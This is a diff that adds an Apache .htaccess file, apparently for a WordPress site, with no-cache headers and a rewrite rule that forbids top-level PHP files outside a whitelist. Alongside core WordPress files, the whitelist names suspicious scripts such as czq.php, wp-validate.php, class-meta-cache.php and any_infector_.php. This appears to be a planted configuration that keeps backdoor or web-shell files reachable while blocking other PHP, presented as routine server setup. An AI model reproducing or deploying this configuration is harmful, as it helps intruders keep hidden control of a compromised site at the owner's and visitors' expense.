@@ -1,0 +1,18 @@
+<IfModule mod_headers.c>
+    Header set Cache-Control "no-cache, no-store, must-revalidate"
+    Header set Pragma "no-cache"
+    Header set Expires 0
+</IfModule>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+
+    RewriteCond %{REQUEST_URI} !^/(index\.php$|wp-login\.php$|wp-signup\.php$|wp-cron\.php$|wp-validate\.php$|czq\.php$|wp_blog_footer\.php$|admin-ajax\.php$|class-meta-cache\.php$|links-xml\.php$|images\.php$|any_infector_\.php$|wp-admin/|wp-content/|wp-includes/) [NC]
+    RewriteRule ^[^/]*\.php$ - [F,L]
+
+    RewriteRule ^index\.php$ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . index.php [L]
+</IfModule>
